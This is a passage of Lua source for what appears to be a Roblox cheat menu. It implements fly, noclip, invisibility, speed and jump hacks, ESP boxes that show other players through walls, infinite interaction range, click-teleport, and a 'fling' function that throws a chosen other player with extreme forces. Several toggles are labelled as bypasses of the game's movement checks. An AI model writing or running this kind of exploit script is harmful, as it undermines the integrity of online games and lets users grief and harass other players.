            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveVector += Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveVector -= Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveVector -= Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveVector += Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveVector += Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveVector -= Vector3.new(0, 1, 0) end

            if moveVector.Magnitude > 0 then
                bodyVelocity.Velocity = moveVector.Unit * V.FlySpeed
                bodyGyro.CFrame = Camera.CFrame
            else
                bodyVelocity.Velocity = Vector3.zero
                bodyGyro.CFrame = Camera.CFrame
            end
        end)
        addConnection(flyConn)
    end)
end

local function stopFly()
    V.Fly = false
    pcall(function()
        local char = getCharacter()
        local root = char:FindFirstChild("HumanoidRootPart")
        for _, obj in pairs(root:GetChildren()) do
            if obj:IsA("BodyGyro") or obj:IsA("BodyVelocity") then obj:Destroy() end
        end
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        humanoid.PlatformStand = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        if not V.Noclip then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
        end
    end)
end

local function startNoclip()
    V.Noclip = true
    local noclipConn = RunService.Stepped:Connect(function()
        if not V.Noclip then noclipConn:Disconnect() return end
        local char = getCharacter()
        if char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end
    end)
    addConnection(noclipConn)
end

local function stopNoclip()
    V.Noclip = false
    pcall(function()
        local char = getCharacter()
        if char and not V.Fly then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
        end
    end)
end

local function toggleInvisibility(enabled)
    V.Invis = enabled
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end

        if V.Invis then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local savedPosition = hrp.CFrame

            local newPos = Vector3.new(0, 100000, 0)
            char:MoveTo(newPos)
            task.wait(0.15)

            local seat = Instance.new("Seat")
            seat.Name = "NebulaInvisChair"
            seat.Anchored = false
            seat.CanCollide = false
            seat.Transparency = 1
            seat.Position = newPos
            seat.Parent = workspace

            local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
            if torso then
                local weld = Instance.new("Weld")
                weld.Part0 = seat
                weld.Part1 = torso
                weld.Parent = seat
                task.wait()
                seat.CFrame = savedPosition

                for _, descendant in char:GetDescendants() do
                    if descendant:IsA("BasePart") or descendant:IsA("Decal") then
                        if descendant.Name == "HumanoidRootPart" then
                            descendant.Transparency = 1
                        else
                            descendant.Transparency = 0.5
                        end
                    end
                end
                notify("Invisibility", "Invisible ON", Color3.fromRGB(80, 200, 120))
            else
                V.Invis = false
            end
        else
            local invisChair = workspace:FindFirstChild("NebulaInvisChair")
            if invisChair then invisChair:Destroy() end

            for _, descendant in char:GetDescendants() do
                if descendant:IsA("BasePart") or descendant:IsA("Decal") then
                    if descendant.Name == "HumanoidRootPart" then
                        descendant.Transparency = 1
                    else
                        descendant.Transparency = 0
                    end
                end
            end
            notify("Invisibility", "Invisible OFF", Color3.fromRGB(255, 90, 90))
        end
    end)
end

LocalPlayer.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        if V.AntiRagdoll then
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false)
            hum.PlatformStand = false
        end
    end
end)

local function startDesyncFly()
    if V.Fly then SetFlyToggle(false) end
    V.DesyncFly = true
    pcall(function()
        local char = getCharacter()
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        humanoid.PlatformStand = true
        hrp.Anchored = true
        local lastPosition = hrp.Position

        local desyncConn = RunService.Heartbeat:Connect(function(dt)
            if not V.DesyncFly then desyncConn:Disconnect() return end
            local cam = workspace.CurrentCamera
            local moveDirection = Vector3.zero
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDirection += cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDirection -= cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDirection -= cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDirection += cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDirection += Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveDirection -= Vector3.new(0, 1, 0) end

            if moveDirection.Magnitude > 0 then
                lastPosition = lastPosition + (moveDirection.Unit * V.DesyncFlySpeed * dt)
                hrp.CFrame = CFrame.new(lastPosition, lastPosition + cam.CFrame.LookVector)
            end
        end)
        addConnection(desyncConn)
    end)
end

local function stopDesyncFly()
    V.DesyncFly = false
    pcall(function()
        local hrp = getRoot()
        local humanoid = getHumanoid()
        hrp.Anchored = false
        humanoid.PlatformStand = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
    end)
end

local function enableNoAnim()
    V.NoAnim = true
    local char = getCharacter()

    local animate = char:FindFirstChild("Animate")
    if animate then
        V.OrigAnim = animate:Clone()
        animate:Destroy()
    end

    V.NoAnimConn = RunService.RenderStepped:Connect(function()
        if not V.NoAnim then return end
        local char = getCharacter()
        if not char then return end
        local humanoid = char:FindFirstChild("Humanoid")
        if not humanoid then return end
        local animator = humanoid:FindFirstChild("Animator")
        if animator then
            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                track:Stop()
            end
        end
    end)
    addConnection(V.NoAnimConn)
    notify("Me", "No Animations ON", Color3.fromRGB(80, 200, 120))
end

local function disableNoAnim()
    V.NoAnim = false
    if V.NoAnimConn then V.NoAnimConn:Disconnect(); V.NoAnimConn = nil end

    local char = LocalPlayer.Character
    if char then
        local animate = char:FindFirstChild("Animate")
        if animate then animate:Destroy() end
        if V.OrigAnim then
            local newAnimate = V.OrigAnim:Clone()
            newAnimate.Parent = char
            V.OrigAnim = nil
        end
    end
    notify("Me", "No Animations OFF", Color3.fromRGB(255, 90, 90))
end

local function startSpectate(player)
    V.Spectate = true
    V.SelPlayer = player
    pcall(function()
        local targetChar = player.Character
        if targetChar then Camera.CameraSubject = targetChar end
    end)
    local specConn = player.CharacterAdded:Connect(function(char)
        Camera.CameraSubject = char
    end)
    addConnection(specConn)
    notify("Spectate", "Spectating " .. player.Name, Color3.fromRGB(80, 200, 120))
end

local function stopSpectate()
    V.Spectate = false
    V.SelPlayer = nil
    pcall(function()
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then Camera.CameraSubject = hum end
        end
    end)
    notify("Spectate", "Spectate OFF", Color3.fromRGB(255, 90, 90))
end

local function startFling(player)
    if V.Flinging then return end
    V.Flinging = true
    V.FlingTarget = player
    local char = getCharacter()
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hrp and hum then
        hum.PlatformStand = true
        local t = 0
        V.FlingConn = RunService.Heartbeat:Connect(function()
            if not V.Flinging or not V.FlingTarget or not V.FlingTarget.Character then
                stopFling()
                return
            end
            local tHrp = V.FlingTarget.Character:FindFirstChild("HumanoidRootPart")
            if tHrp then
                pcall(function()
                    t = t + 0.5
                    hrp.CFrame = tHrp.CFrame * CFrame.new(math.cos(t)*3, 0, math.sin(t)*3) * CFrame.Angles(math.rad(90), 0, 0)
                    hrp.AssemblyAngularVelocity = Vector3.new(0, 99999, 0)
                    hrp.AssemblyLinearVelocity = (tHrp.Position - hrp.Position).Unit * 99999
                end)
            end
        end)
        addConnection(V.FlingConn)
        notify("Troll", "Flinging " .. player.Name, Color3.fromRGB(255, 80, 80))
    end
end

local function stopFling()
    V.Flinging = false
    V.FlingTarget = nil
    if V.FlingConn then V.FlingConn:Disconnect() V.FlingConn = nil end
    pcall(function()
        local char = getCharacter()
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hum then hum.PlatformStand = false end
        if hrp then
            hrp.AssemblyAngularVelocity = Vector3.new(0,0,0)
            hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
        end
    end)
    notify("Troll", "Fling stopped", Color3.fromRGB(255, 80, 80))
end

local movementConn = RunService.Heartbeat:Connect(function(dt)
    pcall(function()
        local char = LocalPlayer.Character
        if char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if humanoid and hrp then
                humanoid.UseJumpPower = true
                humanoid.JumpPower = V.JumpEnabled and V.Jump or 50

                local currentSpeed = V.SpeedEnabled and V.Speed or 16

                if V.CFrameSpeed and humanoid.MoveDirection.Magnitude > 0 then
                    humanoid.WalkSpeed = 0
                    local moveVec = humanoid.MoveDirection
                    hrp.CFrame = hrp.CFrame + (moveVec * currentSpeed * dt)
                else
                    humanoid.WalkSpeed = currentSpeed
                    if humanoid.MoveDirection.Magnitude > 0 then
                        local yVel = hrp.Velocity.Y
                        hrp.Velocity = Vector3.new(humanoid.MoveDirection.X * currentSpeed, yVel, humanoid.MoveDirection.Z * currentSpeed)
                    end
                end

                if V.WallClimb and UserInputService:IsKeyDown(Enum.KeyCode.W) then
                    local rayParams = RaycastParams.new()
                    rayParams.FilterDescendantsInstances = {char}
                    rayParams.FilterType = Enum.RaycastFilterType.Exclude
                    local result = workspace:Raycast(hrp.Position, hrp.CFrame.LookVector * 3, rayParams)
                    if result then
                        hrp.CFrame = hrp.CFrame * CFrame.new(0, currentSpeed * dt, 0)
                    end
                end
            end
        end
    end)
end)
addConnection(movementConn)

local function toggleAntiRagdoll(enabled)
    V.AntiRagdoll = enabled
    pcall(function()
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")

        if enabled then
            if hum then
                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
                hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
                hum:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false)
                hum.PlatformStand = false
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            end

            V.AntiRagdollConn = RunService.Heartbeat:Connect(function()
                pcall(function()
                    local char = LocalPlayer.Character
                    if char then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        local humanoid = char:FindFirstChildOfClass("Humanoid")
                        if hrp and humanoid then
                            if hrp.AssemblyAngularVelocity.Magnitude > 30 then
                                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            end
                            if hrp.AssemblyLinearVelocity.Magnitude > 500 then
                                hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                            end
                            if humanoid.PlatformStand then
                                humanoid.PlatformStand = false
                                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                            end
                            local state = humanoid:GetState()
                            if state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.PlatformStanding then
                                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                            end
                        end
                    end
                end)
            end)
            addConnection(V.AntiRagdollConn)
            notify("Me", "Anti-Ragdoll ON (Ultra)", Color3.fromRGB(80, 200, 120))
        else
            if V.AntiRagdollConn then V.AntiRagdollConn:Disconnect() V.AntiRagdollConn = nil end
            if hum then
                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
                hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
                hum:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, true)
            end
            notify("Me", "Anti-Ragdoll OFF", Color3.fromRGB(255, 90, 90))
        end
    end)
end

local function applyInstant(prompt)
    if V.InstInteract and prompt:IsA("ProximityPrompt") then
        prompt.HoldDuration = 0
    end
end

local function toggleInstantInteract(enabled)
    V.InstInteract = enabled
    if enabled then
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then applyInstant(obj) end
        end
        V.Inst1 = workspace.DescendantAdded:Connect(function(obj) applyInstant(obj) end)
        V.Inst2 = ProximityPromptService.PromptShown:Connect(function(prompt) applyInstant(prompt) end)
        addConnection(V.Inst1)
        addConnection(V.Inst2)
        notify("Me", "Instant Interact ON", Color3.fromRGB(80, 200, 120))
    else
        if V.Inst1 then V.Inst1:Disconnect() V.Inst1 = nil end
        if V.Inst2 then V.Inst2:Disconnect() V.Inst2 = nil end
        notify("Me", "Instant Interact OFF (Rejoin to restore)", Color3.fromRGB(255, 90, 90))
    end
end

local function applyInfiniteRange(prompt)
    if V.InfRange and prompt:IsA("ProximityPrompt") then
        if not Cache.Distances[prompt] then
            Cache.Distances[prompt] = {
                MaxActivationDistance = prompt.MaxActivationDistance,
                RequiresLineOfSight = prompt.RequiresLineOfSight
            }
        end
        prompt.MaxActivationDistance = 99999
        prompt.RequiresLineOfSight = false
    end
end

local function toggleInfiniteRange(enabled)
    V.InfRange = enabled
    if enabled then
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then applyInfiniteRange(obj) end
        end
        V.Inf1 = workspace.DescendantAdded:Connect(function(obj) applyInfiniteRange(obj) end)
        V.Inf2 = ProximityPromptService.PromptShown:Connect(function(prompt) applyInfiniteRange(prompt) end)
        V.InfRangeConn = RunService.RenderStepped:Connect(function()
            for prompt, _ in pairs(Cache.Distances) do
                if prompt and prompt.Parent then
                    prompt.MaxActivationDistance = 99999
                    prompt.RequiresLineOfSight = false
                else
                    Cache.Distances[prompt] = nil
                end
            end
        end)
        addConnection(V.Inf1)
        addConnection(V.Inf2)
        addConnection(V.InfRangeConn)
        notify("Me", "Infinite Interact Range ON", Color3.fromRGB(80, 200, 120))
    else
        if V.Inf1 then V.Inf1:Disconnect() V.Inf1 = nil end
        if V.Inf2 then V.Inf2:Disconnect() V.Inf2 = nil end
        if V.InfRangeConn then V.InfRangeConn:Disconnect() V.InfRangeConn = nil end
        for prompt, data in pairs(Cache.Distances) do
            if prompt and prompt.Parent then
                prompt.MaxActivationDistance = data.MaxActivationDistance
                prompt.RequiresLineOfSight = data.RequiresLineOfSight
            end
        end
        Cache.Distances = {}
        notify("Me", "Infinite Interact Range OFF", Color3.fromRGB(255, 90, 90))
    end
end

local function applyFPSBoost(obj)
    if obj:IsA("BasePart") then
        if not Cache.FPSBoost[obj] then
            Cache.FPSBoost[obj] = {Material = obj.Material, Reflectance = obj.Reflectance}
        end
        obj.Material = Enum.Material.Plastic
        obj.Reflectance = 0
    elseif obj:IsA("Decal") or obj:IsA("Texture") then
        if not Cache.FPSBoost[obj] then
            Cache.FPSBoost[obj] = {Transparency = obj.Transparency}
        end
        obj.Transparency = 1
    elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
        if not Cache.FPSBoost[obj] then
            Cache.FPSBoost[obj] = {Enabled = obj.Enabled}
        end
        obj.Enabled = false
    elseif obj:IsA("PostEffect") then
        if not Cache.FPSBoost[obj] then
            Cache.FPSBoost[obj] = {Enabled = obj.Enabled}
        end
        obj.Enabled = false
    end
end

local function toggleFPSBooster(enabled)
    V.FPSBoost = enabled
    if enabled then
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e6
        Lighting.FogStart = 0
        settings().Rendering.QualityLevel = 1

        for _, obj in pairs(workspace:GetDescendants()) do applyFPSBoost(obj) end
        for _, obj in pairs(Lighting:GetChildren()) do applyFPSBoost(obj) end

        V.FPSBoost1 = workspace.DescendantAdded:Connect(function(obj) applyFPSBoost(obj) end)
        V.FPSBoost2 = Lighting.ChildAdded:Connect(function(obj) applyFPSBoost(obj) end)
        notify("Server", "FPS Booster ON", Color3.fromRGB(80, 200, 120))
    else
        if V.FPSBoost1 then V.FPSBoost1:Disconnect() V.FPSBoost1 = nil end
        if V.FPSBoost2 then V.FPSBoost2:Disconnect() V.FPSBoost2 = nil end

        for obj, data in pairs(Cache.FPSBoost) do
            if obj and obj.Parent then
                if obj:IsA("BasePart") then
                    obj.Material = data.Material
                    obj.Reflectance = data.Reflectance
                elseif obj:IsA("Decal") or obj:IsA("Texture") then
                    obj.Transparency = data.Transparency
                elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("PostEffect") then
                    obj.Enabled = data.Enabled
                end
            end
        end
        Cache.FPSBoost = {}

        settings().Rendering.QualityLevel = Enum.RenderSettings.DefaultQualityLevel
        Lighting.GlobalShadows = true
        notify("Server", "FPS Booster OFF", Color3.fromRGB(255, 90, 90))
    end
end

local function toggleFullbright(enabled)
    V.Fullbright = enabled
    if enabled then
        Cache.Lighting = {
            GlobalShadows = Lighting.GlobalShadows,
            Brightness = Lighting.Brightness,
            Ambient = Lighting.Ambient,
            OutdoorAmbient = Lighting.OutdoorAmbient,
            FogEnd = Lighting.FogEnd,
            FogStart = Lighting.FogStart,
            ClockTime = Lighting.ClockTime,
            ExposureCompensation = Lighting.ExposureCompensation
        }
        Lighting.GlobalShadows = false
        Lighting.Brightness = 3
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
        Lighting.FogEnd = 1e6
        Lighting.FogStart = 0
        Lighting.ClockTime = 14
        Lighting.ExposureCompensation = 0

        Cache.PostEffects = {}
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("PostEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") then
                Cache.PostEffects[v] = v.Enabled
                v.Enabled = false
            end
        end
        notify("Server", "Fullbright ON", Color3.fromRGB(80, 200, 120))
    else
        if Cache.Lighting then
            Lighting.GlobalShadows = Cache.Lighting.GlobalShadows
            Lighting.Brightness = Cache.Lighting.Brightness
            Lighting.Ambient = Cache.Lighting.Ambient
            Lighting.OutdoorAmbient = Cache.Lighting.OutdoorAmbient
            Lighting.FogEnd = Cache.Lighting.FogEnd
            Lighting.FogStart = Cache.Lighting.FogStart
            Lighting.ClockTime = Cache.Lighting.ClockTime
            Lighting.ExposureCompensation = Cache.Lighting.ExposureCompensation
        end

        if Cache.PostEffects then
            for effect, state in pairs(Cache.PostEffects) do
                if effect and effect.Parent then
                    effect.Enabled = state
                end
            end
        end
        Cache.Lighting = nil
        Cache.PostEffects = nil
        notify("Server", "Fullbright OFF", Color3.fromRGB(255, 90, 90))
    end
end

local function clearESP()
    for player, obj in pairs(V.ESPObjects) do
        if obj.conn then obj.conn:Disconnect() end
        if obj.box then obj.box:Destroy() end
        if obj.nameLabel then obj.nameLabel:Destroy() end
        if obj.distLabel then obj.distLabel:Destroy() end
        if obj.highlight then obj.highlight:Destroy() end
    end
    V.ESPObjects = {}
end

local function createESPForPlayer(player)
    if V.ESPObjects[player] then return end
    if player == LocalPlayer and not V.ESPSelf then return end

    local box = Instance.new("Frame")
    box.Visible = false
    box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    box.BackgroundTransparency = 1
    box.BorderSizePixel = 0
    box.Parent = ESPGui

    local boxStroke = Instance.new("UIStroke")
    boxStroke.Thickness = 1.5
    boxStroke.Parent = box

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Visible = false
    nameLabel.BackgroundTransparency = 1
    nameLabel.Font = Enum.Font.GothamMedium
    nameLabel.TextSize = 13
    nameLabel.TextStrokeTransparency = 0
    nameLabel.TextColor3 = V.ESPColor
    nameLabel.Parent = ESPGui

    local distLabel = Instance.new("TextLabel")
    distLabel.Visible = false
    distLabel.BackgroundTransparency = 1
    distLabel.Font = Enum.Font.GothamMedium
    distLabel.TextSize = 12
    distLabel.TextStrokeTransparency = 0
    distLabel.TextColor3 = V.ESPColor
    distLabel.Parent = ESPGui

    local highlight = Instance.new("Highlight")
    highlight.FillColor = V.ESPColor
    highlight.OutlineColor = V.ESPColor
    highlight.FillTransparency = 0.5
    highlight.Enabled = false
    highlight.Parent = nil

    V.ESPObjects[player] = {box = box, boxStroke = boxStroke, nameLabel = nameLabel, distLabel = distLabel, highlight = highlight}

    local conn = RunService.RenderStepped:Connect(function()
        local char = player.Character
        if not char or not V.ESP then
            box.Visible = false
            nameLabel.Visible = false
            distLabel.Visible = false
            highlight.Parent = nil
            return
        end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local head = char:FindFirstChild("Head")
        local hum = char:FindFirstChildOfClass("Humanoid")
        local localChar = LocalPlayer.Character
        if not hrp or not head or not hum or not localChar or not localChar:FindFirstChild("HumanoidRootPart") then
            box.Visible = false
            nameLabel.Visible = false
            distLabel.Visible = false
            highlight.Parent = nil
            return
        end

        local localHrp = localChar.HumanoidRootPart
        local dist = (localHrp.Position - hrp.Position).Magnitude

        local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
        if not onScreen then
            box.Visible = false
            nameLabel.Visible = false
            distLabel.Visible = false
            highlight.Parent = nil
            return
        end

        local headPos = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0))
        local legPos = Camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3.5, 0))
        local height = math.abs(headPos.Y - legPos.Y)
        local width = height / 2.5

        if V.ESPBox then
            box.Visible = true
            box.Size = UDim2.new(0, width, 0, height)
            box.Position = UDim2.new(0, screenPos.X - width/2, 0, screenPos.Y - height/2)
            boxStroke.Color = V.ESPColor
        else
            box.Visible = false
        end

        if V.ESPFilled then
            highlight.Parent = char
            highlight.FillColor = V.ESPColor
            highlight.OutlineColor = V.ESPColor
            highlight.Enabled = true
        else
            highlight.Parent = nil
        end

        if V.ESPName then
            nameLabel.Visible = true
            nameLabel.Text = player.Name
            nameLabel.TextColor3 = V.ESPColor
            nameLabel.Size = UDim2.new(0, 200, 0, 20)
            nameLabel.Position = UDim2.new(0, screenPos.X - 100, 0, screenPos.Y - height/2 - 18)
        else
            nameLabel.Visible = false
        end

        if V.ESPDist then
            distLabel.Visible = true
            distLabel.Text = math.floor(dist) .. "m"
            distLabel.TextColor3 = V.ESPColor
            distLabel.Size = UDim2.new(0, 200, 0, 20)
            distLabel.Position = UDim2.new(0, screenPos.X - 100, 0, screenPos.Y + height/2 + 2)
        else
            distLabel.Visible = false
        end
    end)
    V.ESPObjects[player].conn = conn
end

local function refreshESP()
    clearESP()
    if not V.ESP then return end
    for _, player in pairs(Players:GetPlayers()) do createESPForPlayer(player) end
end

task.spawn(function()
    while true do
        task.wait(1)
        if V.ESP then
            for _, player in pairs(Players:GetPlayers()) do
                if not V.ESPObjects[player] then createESPForPlayer(player) end
            end
        end
    end
end)

Players.PlayerAdded:Connect(function(p)
    if _G.refreshPlayerList then _G.refreshPlayerList() end
    if V.ESP then
        task.wait(0.5)
        createESPForPlayer(p)
    end
end)
Players.PlayerRemoving:Connect(function(p)
    if _G.refreshPlayerList then _G.refreshPlayerList() end
    if V.ESPObjects[p] then
        if V.ESPObjects[p].conn then V.ESPObjects[p].conn:Disconnect() end
        if V.ESPObjects[p].box then V.ESPObjects[p].box:Destroy() end
        if V.ESPObjects[p].nameLabel then V.ESPObjects[p].nameLabel:Destroy() end
        if V.ESPObjects[p].distLabel then V.ESPObjects[p].distLabel:Destroy() end
        if V.ESPObjects[p].highlight then V.ESPObjects[p].highlight:Destroy() end
        V.ESPObjects[p] = nil
    end
end)

local function toggleClickTP(enabled)
    V.ClickTP = enabled
    if enabled then
        if V.ClickTPTool then V.ClickTPTool:Destroy() end
        V.ClickTPTool = Instance.new("Tool")
        V.ClickTPTool.Name = "Click TP Épée"
        V.ClickTPTool.RequiresHandle = true
        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(1, 1, 3)
        handle.CanCollide = false
        handle.Transparency = 1
        handle.Parent = V.ClickTPTool
        
        V.ClickTPTool.Activated:Connect(function()
            local mouse = LocalPlayer:GetMouse()
            local char = getCharacter()
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp and mouse.Hit then
                hrp.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0))
            end
        end)
        V.ClickTPTool.Parent = LocalPlayer.Backpack
        notify("Fun", "Épée Click TP ajoutée !", Color3.fromRGB(80, 200, 120))
    else
        if V.ClickTPTool then
            if V.ClickTPTool.Parent == LocalPlayer.Character then
                V.ClickTPTool:Destroy()
            elseif V.ClickTPTool.Parent == LocalPlayer.Backpack then
                V.ClickTPTool:Destroy()
            end
            V.ClickTPTool = nil
        end
        notify("Fun", "Épée Click TP retirée.", Color3.fromRGB(255, 90, 90))
    end
end

createLabel("SPEED & JUMP", MovementContent)
local _, _, ToggleSpeed = createToggle("Enable Walk Speed", false, function(enabled)
    V.SpeedEnabled = enabled
    notify("Movement", "Walk Speed " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MovementContent, "SpeedEnabled")
createSlider("Walk Speed", 16, 300, 16, function(val) V.Speed = val end, MovementContent, "Speed")

createToggle("Enable Jump Power", false, function(enabled)
    V.JumpEnabled = enabled
    notify("Movement", "Jump Power " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MovementContent, "JumpEnabled")
createSlider("Jump Power", 50, 300, 50, function(val) V.Jump = val end, MovementContent, "Jump")

createToggle("CFrame Speed (Bypass)", false, function(enabled)
    V.CFrameSpeed = enabled
    notify("Movement", "CFrame Speed " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MovementContent, "CFrameSpeed")
createToggle("Wall Climb (Spider)", false, function(enabled)
    V.WallClimb = enabled
    notify("Movement", "Wall Climb " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MovementContent, "WallClimb")

createLabel("GRAVITY", MovementContent)
createSlider("Gravity", 0, 200, 196, function(val) workspace.Gravity = val end, MovementContent)

createLabel("FLIGHT", MovementContent)
local _, SetFlyToggle, ToggleFly = createToggle("Fly (Normal)", false, function(enabled)
    if enabled then startFly() else stopFly() end
    notify("Movement", "Fly " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MovementContent, "Fly")
createSlider("Fly Speed", 50, 500, 150, function(val) V.FlySpeed = val end, MovementContent, "FlySpeed")
local _, SetDesyncToggle, ToggleDesync = createToggle("Fly (Desynch)", false, function(enabled)
    if enabled then startDesyncFly() else stopDesyncFly() end
    notify("Movement", "Desync Fly " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MovementContent, "DesyncFly")
createSlider("Fly Speed (Desync)", 50, 500, 150, function(val) V.DesyncFlySpeed = val end, MovementContent, "DesyncFlySpeed")

createLabel("PLAYER PHYSICS", MeContent)
createToggle("Anti-Ragdoll / Anti-Fling", false, function(enabled) toggleAntiRagdoll(enabled) end, MeContent, "AntiRagdoll")
local _, SetNoclipToggle, ToggleNoclip = createToggle("Noclip", false, function(enabled)
    if enabled then startNoclip() else stopNoclip() end
    notify("Me", "Noclip " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MeContent, "Noclip")

createLabel("AVATAR & ANIMATIONS", MeContent)
createToggle("No Animations", false, function(enabled)
    if enabled then enableNoAnim() else disableNoAnim() end
end, MeContent, "NoAnim")
local _, SetInvisToggle, ToggleInvis = createToggle("Invisible", false, function(enabled) toggleInvisibility(enabled) end, MeContent, "Invis")
createToggle("Infinite Jump", false, function(enabled)
    V.InfJump = enabled
    if enabled then
        local infJumpConn = UserInputService.JumpRequest:Connect(function()
            if V.InfJump then pcall(function() getHumanoid():ChangeState(Enum.HumanoidStateType.Jumping) end) end
        end)
        addConnection(infJumpConn)
    end
    notify("Me", "Infinite Jump " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, MeContent, "InfJump")

createLabel("VISUALS & INTERACTIONS", MeContent)
createToggle("Instant Interact (Universal)", false, function(enabled) toggleInstantInteract(enabled) end, MeContent, "InstInteract")
createToggle("Infinite Interact Range", false, function(enabled) toggleInfiniteRange(enabled) end, MeContent, "InfRange")

createLabel("CAMERA", MeContent)
createSlider("FOV Changer", 70, 120, 70, function(val)
    V.FOV = val
end, MeContent, "FOV")

createLabel("ACTIONS", MeContent)
local function respawnPlayer()
    notify("Me", "Instant Respawn...", Color3.fromRGB(255, 165, 0))
    pcall(function()
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Health = 0
            end
            
            local rs = game:GetService("ReplicatedStorage")
            local resetRemote = rs:FindFirstChild("ResetCharacter") or rs:FindFirstChild("Reset") or rs:FindFirstChild("Respawn")
            if resetRemote and resetRemote:IsA("RemoteEvent") then
                resetRemote:FireServer()
            end
            
            pcall(function() LocalPlayer:LoadCharacter() end)
        end
